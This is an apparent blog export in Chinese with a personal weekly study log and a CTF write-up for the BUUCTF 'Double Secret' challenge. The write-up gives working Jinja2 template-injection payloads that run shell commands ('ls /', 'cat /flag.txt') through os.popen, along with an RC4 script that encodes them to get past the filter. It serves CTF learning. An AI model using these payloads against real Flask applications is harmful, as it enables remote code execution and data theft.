<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>寒假第二&amp;三周_周总结</title>
    <link href="/2024/02/19/2024-2-19-%E5%AF%92%E5%81%87%E7%AC%AC%E4%BA%8C&amp;%E4%B8%89%E5%91%A8_%E5%91%A8%E6%80%BB%E7%BB%93/"/>
    <url>/2024/02/19/2024-2-19-%E5%AF%92%E5%81%87%E7%AC%AC%E4%BA%8C&amp;%E4%B8%89%E5%91%A8_%E5%91%A8%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="寒假第二-三周-周总结-《我的奋斗south版》"><a href="#寒假第二-三周-周总结-《我的奋斗south版》" class="headerlink" title="寒假第二&amp;三周_周总结-《我的奋斗south版》"></a>寒假第二&amp;三周_周总结-《我的奋斗south版》</h1><h2 id="第二-三周"><a href="#第二-三周" class="headerlink" title="第二&amp;三周:"></a>第二&amp;三周:</h2><h3 id="Todo："><a href="#Todo：" class="headerlink" title="Todo："></a>Todo：</h3><h3 id="south"><a href="#south" class="headerlink" title="south:"></a>south:</h3><p>1.BUUCTF第三面题目全部刷完(9道题，周一，周二，周三)（完成13题）</p><p>反思:这两周都是过年的事情，本来以为自己过年会好好学习，还是高看自己了◕‿◕，真的有人过年的时候会好好学习吗，至少我不会(˚ ˃̣̣̥᷄⌓˂̣̣̥᷅ )，最后做到基本上一天一题量已经是我的极限了！第三面总算是告一段段落(๑ᵒ̴̶̷͈᷄ᗨᵒ̴̶̷͈᷅)，开启第四面的新世界，感觉难度又不是一个档次，一题感觉就要磨好几个小时，好多新东西！！！不过总算是开始接触真正意义上有意思的漏洞了૮(˶ᵔ ᵕ ᵔ˶)ა，冲就完了！</p><p>2.[第二届N1CTF Junior]zako复现（周四）(完成)</p><p>反思：这道题复现的超级开心〃•ω‹〃，因为环境自己搭出来了，终于有一道题可以用环境复现了，而且复现的时候也不卡，基本都可以马上学会，而且学了新的文件写入和读取bypass,✧<em>｡ (ˊᗜˋ</em>) ✧*｡牛皮！只希望我之后比赛都能够记住૮₍ ˃ ⤙ ˂ ₎ა(老年人的记忆emmm)。</p><p>3.健身4次（4次）</p><p>反思：只有第二周健身了，因为健身房也放假了，第三周基本开摆不想动，下周得加一下强度，不能摆了ᜊ(꒪ˊ꒳ˋ꒪)ᜊ。</p><p>5.VNCTF做出一道web题</p><p>反思：哦不，简直是耻辱啊，学了这么久才做出一道，可恶！！！受不了红温了(っ◞‸◟c)，但其实仔细想想确实是自己的知识储备不够，以及查找能力的不够熟练，其实有一题我已经找到相关文章了，但是看了这么久就是忽略了一个地方，导致怎么都做不出来，下次数据包还是得看仔细点，还有题目的所有的业务逻辑点都要去看一遍，因为万一这个点就有hint呢ჴ˘ര‸രჴ！！！再接再励吧，south!</p><h2 id="学习"><a href="#学习" class="headerlink" title="学习:"></a>学习:</h2><h3 id="第二周-第三周（2-5-2-18）："><a href="#第二周-第三周（2-5-2-18）：" class="headerlink" title="第二周&amp;第三周（2.5-2.18）："></a>第二周&amp;第三周（2.5-2.18）：</h3><ul><li><p><input checked disabled type="checkbox"> </p><h5 id="RootersCTF2019-I"><a href="#RootersCTF2019-I" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="第二届N1CTF-Junior-zako复现"><a href="#第二届N1CTF-Junior-zako复现" class="headerlink" title="[第二届N1CTF Junior]zako复现"></a>[第二届N1CTF Junior]zako复现</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="网鼎杯-2020-半决赛-AliceWebsite"><a href="#网鼎杯-2020-半决赛-AliceWebsite" class="headerlink" title="[网鼎杯 2020 半决赛]AliceWebsite"></a>[网鼎杯 2020 半决赛]AliceWebsite</h5></li></ul><h2 id="生活"><a href="#生活" class="headerlink" title="生活:"></a>生活:</h2><p>1.《思维改变生活》看了一章</p><p>反思：看到第四章的时候我感觉有点不对劲了，因为书本中的思维方式与我的思维方式有太大的冲击了，我越看越不认可，反正到现在我也不认可它的观念(꒪⌓꒪)，又或是自己经历的事情太浅了，还看不明白?反正到现在还处于抵触状态，所以再考虑换一本书，不过暂时应该不用，不知道为啥最近心态有种前所未有的平静感づ♡ど，所以应该暂时不用了吧，也许,,,,,</p><p>2.过年</p><p>总结：过年的感觉吧，就是硬平躺享受就对了ᕕ( ᐛ )ᕗ。</p><h2 id="工作："><a href="#工作：" class="headerlink" title="工作："></a>工作：</h2><p>1.开了web部门的周会</p><p>反思：周会和大家聊了很多，很开心，一起学习共进感觉真好，而且讨论问题真的好有趣，可以了解大家很多想法，相互提建议，太酷啦(✧∇✧)！这周很简单，因为过年，所以也没啥好总结的，不过下周就要回到正轨了，冲冲冲(ᕑᗢᓫ∗)˒！</p><h2 id="娱乐"><a href="#娱乐" class="headerlink" title="娱乐:"></a>娱乐:</h2><p>1.看了《热辣滚烫》《熊出没》</p><p>总结：《热辣滚烫》我个人认为还是很好看的，至少我很快乐看的时候，看到贾玲一年减了100斤，确实震惊到了，大波浪的贾玲，你别说，还真挺好看的(✧∇✧)，不过这部影片好像是翻拍日本的《百元之恋》，然后最近风评好像出现两极分化了，不过我无所谓，因为我看的爽就完了(*＞◡❛)。《熊出没》真的是太好看了，太好看了，太好看了，重要的事情说三遍，真的强烈推荐，从来没有一部电影能有这么让我共情，而且动画的场面也很宏伟，很像复联四最后打灭霸的场景，反正就是说看的非常爽！文戏我个人认为非常不错。最后再强调一下，太好看了，不愧是春节档最强顶流，以后春节我的固定的任务了！！！✧*｡ (ˊᗜˋ*) ✧*｡</p><p>2.买了水沉香</p><p>总结：太好闻了，据说有益于呼吸道和心血管健康，短视频刷到的，反正我都在喝茶养老了，再多一个(✧∇✧)，学习的时候点一根真的静心！！！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h2><p>路漫漫其修远兮，吾将上下而求索。</p><h2 id="第四周"><a href="#第四周" class="headerlink" title="第四周:"></a>第四周:</h2><h3 id="Todo"><a href="#Todo" class="headerlink" title="Todo:"></a>Todo:</h3><p>1.vnctf题目复现（3天）</p><p>2.buuctf继续，尽量6题往上</p><p>3.准备面试</p><p>4.健身三次</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_[CISCN2019 华东南赛区]Double Secret</title>
    <link href="/2024/02/19/2024-02-19-%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DDouble%20Secret/"/>
    <url>/2024/02/19/2024-02-19-%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DDouble%20Secret/</url>
    
    <content type="html"><![CDATA[<h1 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><p>[<a href="https://www.cnblogs.com/h3zh1/p/12653579.html">CISCN2019 华东南赛区]Double Secret - 何止(h3zh1) - 博客园 (cnblogs.com)</a></p><h2 id="场景"><a href="#场景" class="headerlink" title="场景:"></a>场景:</h2><p><img src="/images/2024-2-18/image-20240214100310464.png" alt="image-20240214100310464"></p><p>我们尝试用dirsearch扫一下网站的后台找一下，其实可以猜测BP抓包中的cookie，或者网页url&#x2F;secret</p><p>使用dirsearch扫一下网站的后台文件：</p><p><img src="/images/2024-2-18/image-20240214100825023.png" alt="image-20240214100825023"></p><h3 id="访问-robots-txt"><a href="#访问-robots-txt" class="headerlink" title="访问:robots.txt:"></a>访问:robots.txt:</h3><p><img src="/images/2024-2-18/image-20240214214745096.png" alt="image-20240214214745096"></p><p>没有获得有用信息。</p><h3 id="访问console"><a href="#访问console" class="headerlink" title="访问console:"></a>访问console:</h3><p><img src="/images/2024-2-18/image-20240214214843671.png" alt="image-20240214214843671"></p><p>存在控制台，但是我们不知道pin码所以无法使用。</p><h2 id="访问url-secret"><a href="#访问url-secret" class="headerlink" title="访问url&#x2F;secret:"></a>访问url&#x2F;secret:</h2><p>因为让我们寻找secret,现在其他途径都尝试过了，所以只能先访问以下url&#x2F;secret试试</p><p><img src="/images/2024-2-18/image-20240214215135531.png" alt="image-20240214215135531"></p><p>回显了不同的内容，根据回显内容，它让我们传输secret的值，尝试在这个界面用GET或POST请求输入secret的值</p><h2 id="传输secret的值"><a href="#传输secret的值" class="headerlink" title="传输secret的值:"></a>传输secret的值:</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secret?secret=1<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240214215317954.png" alt="image-20240214215317954"></p><p>回显d内容，我们可以随便输入一些内容试试,通过控制台我们知道该网页是app.py控制的，所以一般随便输入的内容可能会引起报错，所以越随便越好。</p><h3 id="随便传一个secret值"><a href="#随便传一个secret值" class="headerlink" title="随便传一个secret值:"></a>随便传一个secret值:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secret?secret=dadasdsadsadsa<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240214215536521.png" alt="image-20240214215536521"></p><p>发生报错，并存在源码泄露。</p><h2 id="寻找和flag或者secret相关的源码内容"><a href="#寻找和flag或者secret相关的源码内容" class="headerlink" title="寻找和flag或者secret相关的源码内容:"></a>寻找和flag或者secret相关的源码内容:</h2><p><img src="/images/2024-2-18/image-20240214215638220.png" alt="image-20240214215638220"></p><h3 id="源码"><a href="#源码" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py">   <span class="hljs-keyword">if</span>(secret==<span class="hljs-literal">None</span>):<br><br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span><br><br>   rc=rc4_Modified.RC4(<span class="hljs-string">&quot;HereIsTreasure&quot;</span>)   <span class="hljs-comment">#解密</span><br><br>   deS=rc.do_crypt(secret)<br><br><br><br>[Open an interactive python shell <span class="hljs-keyword">in</span> this frame]     a=render_template_string(safe(deS))<br><br><br><br>   <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ciscn&#x27;</span> <span class="hljs-keyword">in</span> a.lower():<br><br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;flag detected!&#x27;</span><br><br>   <span class="hljs-keyword">return</span> a<br></code></pre></td></tr></table></figure><p>app.py将内容回显到网页中采用render_template_string,所以尝试找一下该函数所在代码</p><h2 id="寻找render-template-string源码"><a href="#寻找render-template-string源码" class="headerlink" title="寻找render_template_string源码:"></a>寻找render_template_string源码:</h2><p><img src="/images/2024-2-18/image-20240214220707751.png" alt="image-20240214220707751"></p><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py">:param context: the variables that should be available <span class="hljs-keyword">in</span> the<br><br>                   context of the template.<br><br>   <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">   ctx = _app_ctx_stack.top</span><br><span class="hljs-string"></span><br><span class="hljs-string">   ctx.app.update_template_context(context)</span><br><span class="hljs-string"></span><br><span class="hljs-string">   return _render(ctx.app.jinja_env.from_string(source),</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Open an interactive python shell in this frame]                    context, ctx.app)</span><br></code></pre></td></tr></table></figure><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">1.根据源码审计，我们输入的内容secret通过rc=rc4_Modified.RC4(&quot;HereIsTreasure&quot;)以及deS=rc.do_crypt(secret)进行rc4解密后,密钥是HereIsTreasure,在经过safe()函数的检查，然后通过render_template_string(safe(deS))输出到网页上，而网页的render_template_string(safe(deS))函数采用的是jinja模板，所以可以进行jinja模板注入。<br>2.这里的safe()函数没有源码泄露，所以只能先尝试使用我们现在的模板注入payload。<br></code></pre></td></tr></table></figure><h2 id="jinja模板注入payload"><a href="#jinja模板注入payload" class="headerlink" title="jinja模板注入payload:"></a>jinja模板注入payload:</h2><h3 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p>由于app.py对我们的输入的secret内容进行解密再输出到网页上，所以我们要先对我们的网页进行rc4加密</p><h2 id="rc4加密脚本"><a href="#rc4加密脚本" class="headerlink" title="rc4加密脚本:"></a>rc4加密脚本:</h2><p>[<a href="https://www.cnblogs.com/h3zh1/p/12653579.html">CISCN2019 华东南赛区]Double Secret - 何止(h3zh1) - 博客园 (cnblogs.com)</a></p><h3 id="密钥"><a href="#密钥" class="headerlink" title="密钥:"></a>密钥:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">HereIsTreasure<br></code></pre></td></tr></table></figure><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本:"></a>脚本:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php">import base64<br><span class="hljs-keyword">from</span> urllib import parse<br><br>def <span class="hljs-title function_ invoke__">rc4_main</span>(key = <span class="hljs-string">&quot;init_key&quot;</span>, message = <span class="hljs-string">&quot;init_message&quot;</span>):<span class="hljs-comment">#返回加密后得内容</span><br>    s_box = <span class="hljs-title function_ invoke__">rc4_init_sbox</span>(key)<br>    crypt = <span class="hljs-title function_ invoke__">str</span>(<span class="hljs-title function_ invoke__">rc4_excrypt</span>(message, s_box))<br>    <span class="hljs-keyword">return</span>  crypt<br><br>def <span class="hljs-title function_ invoke__">rc4_init_sbox</span>(key):<br>    s_box = <span class="hljs-keyword">list</span>(<span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">256</span>)) <br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s_box[i] + <span class="hljs-title function_ invoke__">ord</span>(key[i % <span class="hljs-title function_ invoke__">len</span>(key)])) % <span class="hljs-number">256</span><br>        s_box[i], s_box[j] = s_box[j], s_box[i]<br>    <span class="hljs-keyword">return</span> s_box<br>def <span class="hljs-title function_ invoke__">rc4_excrypt</span>(plain, box):<br>    res = []<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> s in plain:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + box[i]) % <span class="hljs-number">256</span><br>        box[i], box[j] = box[j], box[i]<br>        t = (box[i] + box[j]) % <span class="hljs-number">256</span><br>        k = box[t]<br>        res.<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(s) ^ k))<br>    cipher = <span class="hljs-string">&quot;&quot;</span>.<span class="hljs-title function_ invoke__">join</span>(res)<br>    <span class="hljs-keyword">return</span> (<span class="hljs-title function_ invoke__">str</span>(base64.<span class="hljs-title function_ invoke__">b64encode</span>(cipher.<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)), <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br>key = <span class="hljs-string">&quot;HereIsTreasure&quot;</span>  <span class="hljs-comment">#此处为密文</span><br>message = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&quot;请输入明文:\n&quot;</span>)<br>enc_base64 = <span class="hljs-title function_ invoke__">rc4_main</span>( key , message )<br>enc_init = <span class="hljs-title function_ invoke__">str</span>(base64.<span class="hljs-title function_ invoke__">b64decode</span>(enc_base64),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>enc_url = parse.<span class="hljs-title function_ invoke__">quote</span>(enc_init)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;rc4加密后的url编码:&quot;</span>+enc_url)<br><span class="hljs-comment">#print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span><br><br></code></pre></td></tr></table></figure><h3 id="测试"><a href="#测试" class="headerlink" title="测试:"></a>测试:</h3><p><img src="/images/2024-2-18/image-20240214221658127.png" alt="image-20240214221658127"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?secret=d%5D%0A<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240214221817599.png" alt="image-20240214221817599"></p><p>成功回显123！！！</p><h2 id="使用rc4加密脚本加密我们的payload"><a href="#使用rc4加密脚本加密我们的payload" class="headerlink" title="使用rc4加密脚本加密我们的payload:"></a>使用rc4加密脚本加密我们的payload:</h2><h3 id="需要加密的payload"><a href="#需要加密的payload" class="headerlink" title="需要加密的payload:"></a>需要加密的payload:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240214222412400.png" alt="image-20240214222412400"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">rc4加密后的url编码:.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B3%C2%BB%C3%9C%C3%B5%C2%82%C2%A8%1Fw%C2%91%C2%89%C2%BB%C2%A3%C3%90E%08%C3%98%C2%BBR%C2%88-V%1B%C3%99%C2%96u%08%1E%0BZ%C3%A3%C3%AA%C2%8E%2Bs%C2%B8%2A%0D%06%C3%AE_%C3%974%C3%8C%C2%9D%C3%A9%2A%C3%B2%C3%AB%17V%C3%95%C3%96%22%C2%93c_G%06%C3%A5%C3%87%C3%A1%C2%A7%C3%AA%C3%8Fw%19%21a%5D%C3%90%15%C3%85%7B%14%C2%B7%C2%90I%3A0%C3%A1%C2%BB.%C3%B0%C2%87%C3%B8K%0C%C3%9BL%24%22%C3%B1%C2%B8X%C3%8D%C3%BE%C3%83o%C3%BA%C2%B8%C3%88l%C2%97eH%C2%BD%C2%BA%C2%9A%C2%93R2%C3%95%C3%AB%C3%AF%1A%C2%AA%21%C2%85%C2%BCqZ%22g<br></code></pre></td></tr></table></figure><h2 id="获取网页的根目录"><a href="#获取网页的根目录" class="headerlink" title="获取网页的根目录:"></a>获取网页的根目录:</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secret?secret=.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B3%C2%BB%C3%9C%C3%B5%C2%82%C2%A8%1Fw%C2%91%C2%89%C2%BB%C2%A3%C3%90E%08%C3%98%C2%BBR%C2%88-V%1B%C3%99%C2%96u%08%1E%0BZ%C3%A3%C3%AA%C2%8E%2Bs%C2%B8%2A%0D%06%C3%AE_%C3%974%C3%8C%C2%9D%C3%A9%2A%C3%B2%C3%AB%17V%C3%95%C3%96%22%C2%93c_G%06%C3%A5%C3%87%C3%A1%C2%A7%C3%AA%C3%8Fw%19%21a%5D%C3%90%15%C3%85%7B%14%C2%B7%C2%90I%3A0%C3%A1%C2%BB.%C3%B0%C2%87%C3%B8K%0C%C3%9BL%24%22%C3%B1%C2%B8X%C3%8D%C3%BE%C3%83o%C3%BA%C2%B8%C3%88l%C2%97eH%C2%BD%C2%BA%C2%9A%C2%93R2%C3%95%C3%AB%C3%AF%1A%C2%AA%21%C2%85%C2%BCqZ%22g<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240214222530142.png" alt="image-20240214222530142"></p><p>发现我们的payload没有被过滤，同时发现了一个flag.txt文件</p><h2 id="查看flag-txt文件内容"><a href="#查看flag-txt文件内容" class="headerlink" title="查看flag.txt文件内容:"></a>查看flag.txt文件内容:</h2><h3 id="需要加密的payload-1"><a href="#需要加密的payload-1" class="headerlink" title="需要加密的payload:"></a>需要加密的payload:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag.txt&#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><h3 id="rc4加密payload"><a href="#rc4加密payload" class="headerlink" title="rc4加密payload:"></a>rc4加密payload:</h3><p><img src="/images/2024-2-18/image-20240214222801441.png" alt="image-20240214222801441"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">rc4加密后的url编码:.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B3%C2%BB%C3%9C%C3%B5%C2%82%C2%A8%1Fw%C2%91%C2%89%C2%BB%C2%A3%C3%90E%08%C3%98%C2%BBR%C2%88-V%1B%C3%99%C2%96u%08%1E%0BZ%C3%A3%C3%AA%C2%8E%2Bs%C2%B8%2A%0D%06%C3%AE_%C3%974%C3%8C%C2%9D%C3%A9%2A%C3%B2%C3%AB%17V%C3%95%C3%96%22%C2%93c_G%06%C3%A5%C3%87%C3%A1%C2%A7%C3%AA%C3%8Fw%19%21a%5D%C3%90%15%C3%85%7B%1B%C2%A5%C3%84I5v%C2%AD%C3%BAi%C3%BE%C3%93%C2%A0%1F%04%C3%95Kx5%C3%B5%C2%BD%14%C3%8C%C3%B5%C3%88%3B%C3%BA%C2%BE%C2%96i%C3%92nB%C2%B0%C2%B5%C3%9C%C2%96%0A4%C2%8B%C3%AE%C2%AA%11%C2%A0%23%C2%8C%C2%A1%23_z<br></code></pre></td></tr></table></figure><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 